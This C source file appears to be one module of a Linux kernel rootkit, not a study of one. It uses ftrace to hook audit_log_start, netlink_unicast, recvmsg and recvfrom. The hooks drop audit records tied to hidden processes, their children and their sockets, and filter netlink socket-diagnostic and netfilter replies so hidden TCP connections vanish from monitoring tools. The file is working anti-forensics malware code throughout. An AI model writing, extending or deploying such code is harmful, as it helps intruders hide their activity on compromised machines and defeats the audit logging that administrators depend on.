#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/audit.h"
#include "../include/hiding_tcp.h"

static int (*orig_netlink_unicast)(struct sock *ssk, struct sk_buff *skb, u32 portid, int nonblock);
static asmlinkage long (*orig_recvmsg)(const struct pt_regs *regs);
static asmlinkage long (*orig_recvfrom)(const struct pt_regs *regs);
static struct audit_buffer *(*orig_audit_log_start)(struct audit_context *ctx, gfp_t gfp_mask, int type);

static atomic_t blocked_audits = ATOMIC_INIT(0);
static atomic_t total_audits = ATOMIC_INIT(0);

#define MAX_HIDDEN_INODES 256
static unsigned long hidden_socket_inodes[MAX_HIDDEN_INODES];
static int hidden_inode_count = 0;
static DEFINE_SPINLOCK(hidden_inode_lock);

notrace void add_hidden_socket_inode(unsigned long ino)
{
    unsigned long flags;
    int i;
    
    if (ino == 0)
        return;
    
    spin_lock_irqsave(&hidden_inode_lock, flags);
    
    for (i = 0; i < hidden_inode_count; i++) {
        if (hidden_socket_inodes[i] == ino) {
            spin_unlock_irqrestore(&hidden_inode_lock, flags);
            return;
        }
    }
    
    if (hidden_inode_count < MAX_HIDDEN_INODES) {
        hidden_socket_inodes[hidden_inode_count++] = ino;
    }
    
    spin_unlock_irqrestore(&hidden_inode_lock, flags);
}

notrace static bool is_inode_hidden(unsigned long ino)
{
    unsigned long flags;
    int i;
    bool found = false;
    
    if (ino == 0)
        return false;
    
    spin_lock_irqsave(&hidden_inode_lock, flags);
    
    for (i = 0; i < hidden_inode_count; i++) {
        if (hidden_socket_inodes[i] == ino) {
            found = true;
            break;
        }
    }
    
    spin_unlock_irqrestore(&hidden_inode_lock, flags);
    
    return found;
}

notrace static void scan_hidden_process_sockets(void)
{
    struct task_struct *task;
    struct files_struct *files;
    struct fdtable *fdt;
    unsigned int fd;
    struct file *file;
    struct inode *inode;
    int i;
    
    rcu_read_lock();
    
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] <= 0)
            continue;
            
        task = pid_task(find_vpid(hidden_pids[i]), PIDTYPE_PID);
        if (!task || !task->files)
            continue;
        
        files = task->files;
        spin_lock(&files->file_lock);
        fdt = files_fdtable(files);
        
        if (fdt) {
            for (fd = 0; fd < fdt->max_fds; fd++) {
                file = fdt->fd[fd];
                if (!file)
                    continue;
                
                inode = file_inode(file);
                if (inode && S_ISSOCK(inode->i_mode)) {
                    spin_unlock(&files->file_lock);
                    add_hidden_socket_inode(inode->i_ino);
                    spin_lock(&files->file_lock);
                }
            }
        }
        
        spin_unlock(&files->file_lock);
    }
    
    for (i = 0; i < child_count; i++) {
        if (child_pids[i] <= 0)
            continue;
            
        task = pid_task(find_vpid(child_pids[i]), PIDTYPE_PID);
        if (!task || !task->files)
            continue;
        
        files = task->files;
        spin_lock(&files->file_lock);
        fdt = files_fdtable(files);
        
        if (fdt) {
            for (fd = 0; fd < fdt->max_fds; fd++) {
                file = fdt->fd[fd];
                if (!file)
                    continue;
                
                inode = file_inode(file);
                if (inode && S_ISSOCK(inode->i_mode)) {
                    spin_unlock(&files->file_lock);
                    add_hidden_socket_inode(inode->i_ino);
                    spin_lock(&files->file_lock);
                }
            }
        }
        
        spin_unlock(&files->file_lock);
    }
    
    rcu_read_unlock();
}

static notrace const char* find_substring_safe(const char *haystack, size_t haystack_len, 
                                               const char *needle, size_t needle_len)
{
    size_t i;
    
    if (!haystack || !needle || needle_len == 0 || needle_len > haystack_len)
        return NULL;
    
    for (i = 0; i <= haystack_len - needle_len; i++) {
        if (memcmp(haystack + i, needle, needle_len) == 0)
            return haystack + i;
    }
    
    return NULL;
}

static notrace pid_t extract_pid_from_audit_msg(const char *data, size_t len)
{
    const char *pid_start;
    char pid_str[16];
    int i, pid_len;
    long pid;
    const char *data_end;
    
    if (!data || len == 0 || len > 65536)
        return -1;
    
    data_end = data + len;
    pid_start = find_substring_safe(data, len, "pid=", 4);
    if (!pid_start)
        return -1;
    
    pid_start += 4;
    if (pid_start >= data_end)
        return -1;
    
    pid_len = 0;
    for (i = 0; i < 15 && (pid_start + i) < data_end; i++) {
        char c = pid_start[i];
        if (c >= '0' && c <= '9') {
            pid_str[pid_len++] = c;
        } else {
            break;
        }
    }
    
    if (pid_len == 0)
        return -1;
    
    pid_str[pid_len] = '\0';
    if (kstrtol(pid_str, 10, &pid) != 0)
        return -1;
    
    if (pid <= 0 || pid > PID_MAX_DEFAULT)
        return -1;
    
    return (pid_t)pid;
}

static notrace unsigned long extract_socket_inode(const char *data, size_t len)
{
    const char *start;
    char inode_str[16];
    int i, inode_len;
    unsigned long inode;
    const char *data_end;
    
    if (!data || len == 0 || len > 65536)
        return 0;
    
    data_end = data + len;
    
    start = find_substring_safe(data, len, "socket:[", 8);
    if (start) {
        start += 8;
        if (start >= data_end)
            return 0;
        
        inode_len = 0;
        for (i = 0; i < 15 && (start + i) < data_end; i++) {
            char c = start[i];
            if (c >= '0' && c <= '9') {
                inode_str[inode_len++] = c;
            } else if (c == ']') {
                break;
            } else {
                break;
            }
        }
        
        if (inode_len > 0) {
            inode_str[inode_len] = '\0';
            if (kstrtoul(inode_str, 10, &inode) == 0)
                return inode;
        }
    }
    
    start = find_substring_safe(data, len, "ino=", 4);
    if (start) {
        start += 4;
        if (start >= data_end)
            return 0;
        
        inode_len = 0;
        for (i = 0; i < 15 && (start + i) < data_end; i++) {
            char c = start[i];
            if (c >= '0' && c <= '9') {
                inode_str[inode_len++] = c;
            } else {
                break;
            }
        }
        
        if (inode_len > 0) {
            inode_str[inode_len] = '\0';
            if (kstrtoul(inode_str, 10, &inode) == 0)
                return inode;
        }
    }
    
    return 0;
}

static notrace bool contains_hidden_proc_path(const char *data, size_t len)
{
    const char *proc_start;
    char pid_str[16];
    int i, pid_len;
    long pid;
    size_t offset = 0;
    
    if (!data || len < 7)
        return false;
    
    while (offset < len - 6) {
        proc_start = find_substring_safe(data + offset, len - offset, "/proc/", 6);
        if (!proc_start)
            break;
        
        offset = (proc_start - data) + 6;
        if (offset >= len)
            break;
        
        pid_len = 0;
        for (i = 0; i < 15 && (offset + i) < len; i++) {
            char c = data[offset + i];
            if (c >= '0' && c <= '9') {
                pid_str[pid_len++] = c;
            } else {
                break;
            }
        }
        
        if (pid_len > 0) {
            pid_str[pid_len] = '\0';
            if (kstrtol(pid_str, 10, &pid) == 0 && pid > 0) {
                if (is_hidden_pid((pid_t)pid) || is_child_pid((pid_t)pid))
                    return true;
            }
        }
        
        offset += pid_len + 1;
    }
    
    return false;
}

static notrace bool is_audit_socket(struct sock *sk)
{
    if (!sk || !sk->sk_socket)
        return false;
    if (sk->sk_family != AF_NETLINK)
        return false;
    if (sk->sk_protocol != NETLINK_AUDIT)
        return false;
    return true;
}

static notrace bool is_valid_netlink_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;
    
    if (!skb || !skb->data || skb->len < NLMSG_HDRLEN)
        return false;
    
    nlh = (struct nlmsghdr *)skb->data;
    if (!NLMSG_OK(nlh, skb->len) || nlh->nlmsg_len > skb->len)
        return false;
    
    return true;
}

static notrace bool should_block_audit_msg(const char *payload, size_t payload_len)
{
    pid_t msg_pid;
    unsigned long socket_ino;
    
    scan_hidden_process_sockets();
    
    msg_pid = extract_pid_from_audit_msg(payload, payload_len);
    if (msg_pid > 0 && (is_hidden_pid(msg_pid) || is_child_pid(msg_pid)))
        return true;
    
    socket_ino = extract_socket_inode(payload, payload_len);
    if (socket_ino > 0 && is_inode_hidden(socket_ino))
        return true;
    
    if (contains_hidden_proc_path(payload, payload_len))
        return true;
    
    return false;
}

static notrace bool is_current_process_hidden(void)
{
    struct task_struct *task = current;
    pid_t pid, tgid, ppid;
    
    if (!task)
        return false;
    
    pid = task->pid;
    tgid = task->tgid;
    
    if (is_hidden_pid(pid) || is_hidden_pid(tgid))
        return true;
    
    if (is_child_pid(pid) || is_child_pid(tgid))
        return true;
    
    if (task->real_parent) {
        ppid = task->real_parent->tgid;
        if (is_hidden_pid(ppid) || is_child_pid(ppid))
            return true;
    }
    
    return false;
}

static notrace struct audit_buffer *hook_audit_log_start(struct audit_context *ctx,
                                                          gfp_t gfp_mask, int type)
{
    if (is_current_process_hidden()) {
        atomic_inc(&blocked_audits);
        return NULL;
    }
    
    atomic_inc(&total_audits);
    return orig_audit_log_start(ctx, gfp_mask, type);
}

static notrace int hook_netlink_unicast(struct sock *ssk, struct sk_buff *skb, 
                                        u32 portid, int nonblock)
{
    struct nlmsghdr *nlh;
    unsigned char *payload;
    size_t payload_len;

    if (!is_audit_socket(ssk))
        goto send_normal;
    
    if (!is_valid_netlink_msg(skb))
        goto send_normal;
    
    nlh = (struct nlmsghdr *)skb->data;
    payload = NLMSG_DATA(nlh);
    payload_len = nlmsg_len(nlh);
    
    if (!payload || payload_len == 0 || payload_len > 65536)
        goto send_normal;
    
    if (should_block_audit_msg((const char *)payload, payload_len)) {
        atomic_inc(&blocked_audits);
        consume_skb(skb);
        return 0;
    }

send_normal:
    return orig_netlink_unicast(ssk, skb, portid, nonblock);
}

static notrace asmlinkage long hook_recvmsg(const struct pt_regs *regs)
{
    long ret;
    int fd, err;
    struct user_msghdr __user *umsg;
    struct user_msghdr kmsg;
    struct iovec iov;
    struct socket *sock;
    int protocol;
    unsigned char *kbuf = NULL;
    long new_len;

    ret = orig_recvmsg(regs);
    
    if (ret <= 0)
        return ret;

    fd = (int)regs->di;
    umsg = (struct user_msghdr __user *)regs->si;

    err = 0;
    sock = sockfd_lookup(fd, &err);
    if (!sock)
        return ret;
    
    if (sock->sk->sk_family != AF_NETLINK) {
        sockfd_put(sock);
        return ret;
    }
    
    protocol = sock->sk->sk_protocol;
    sockfd_put(sock);
    
    if (protocol != NETLINK_SOCK_DIAG && protocol != NETLINK_NETFILTER)
        return ret;

    if (copy_from_user(&kmsg, umsg, sizeof(kmsg)))
        return ret;

    if (kmsg.msg_iovlen < 1 || !kmsg.msg_iov)
        return ret;

    if (copy_from_user(&iov, kmsg.msg_iov, sizeof(iov)))
        return ret;

    if (!iov.iov_base || iov.iov_len == 0)
        return ret;

    kbuf = kvmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, iov.iov_base, ret)) {
        kvfree(kbuf);
        return ret;
    }

    new_len = tcp_hiding_filter_netlink(protocol, kbuf, ret);

    if (new_len != ret && new_len > 0) {
        if (copy_to_user(iov.iov_base, kbuf, new_len) == 0)
            ret = new_len;
    }

    kvfree(kbuf);
    return ret;
}

static notrace asmlinkage long hook_recvfrom(const struct pt_regs *regs)
{
    long ret;
    int fd, err;
    void __user *ubuf;
    struct socket *sock;
    int protocol;
    unsigned char *kbuf = NULL;
    long new_len;

    ret = orig_recvfrom(regs);
    
    if (ret <= 0)
        return ret;

    fd = (int)regs->di;
    ubuf = (void __user *)regs->si;

    err = 0;
    sock = sockfd_lookup(fd, &err);
    if (!sock)
        return ret;
    
    if (sock->sk->sk_family != AF_NETLINK) {
        sockfd_put(sock);
        return ret;
    }
    
    protocol = sock->sk->sk_protocol;
    sockfd_put(sock);
    
    if (protocol != NETLINK_SOCK_DIAG && protocol != NETLINK_NETFILTER)
        return ret;

    kbuf = kvmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, ubuf, ret)) {
        kvfree(kbuf);
        return ret;
    }

    new_len = tcp_hiding_filter_netlink(protocol, kbuf, ret);

    if (new_len != ret && new_len > 0) {
        if (copy_to_user(ubuf, kbuf, new_len) == 0)
            ret = new_len;
    }

    kvfree(kbuf);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("audit_log_start", hook_audit_log_start, &orig_audit_log_start),
    HOOK("netlink_unicast", hook_netlink_unicast, &orig_netlink_unicast),
    HOOK("__x64_sys_recvmsg", hook_recvmsg, &orig_recvmsg),
    HOOK("__x64_sys_recvfrom", hook_recvfrom, &orig_recvfrom),
};

notrace int hooking_audit_init(void)
{
    int ret;
    
    atomic_set(&blocked_audits, 0);
    atomic_set(&total_audits, 0);
    hidden_inode_count = 0;
    
    ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret)
        return ret;
    
    return 0;
}

notrace void hooking_audit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace int get_blocked_audit_count(void)
{
    return atomic_read(&blocked_audits);
}

notrace int get_total_audit_count(void)
{
    return atomic_read(&total_audits);
}

EXPORT_SYMBOL(hooking_audit_init);
EXPORT_SYMBOL(hooking_audit_exit);
EXPORT_SYMBOL(get_blocked_audit_count);
EXPORT_SYMBOL(get_total_audit_count);
EXPORT_SYMBOL(add_hidden_socket_inode);
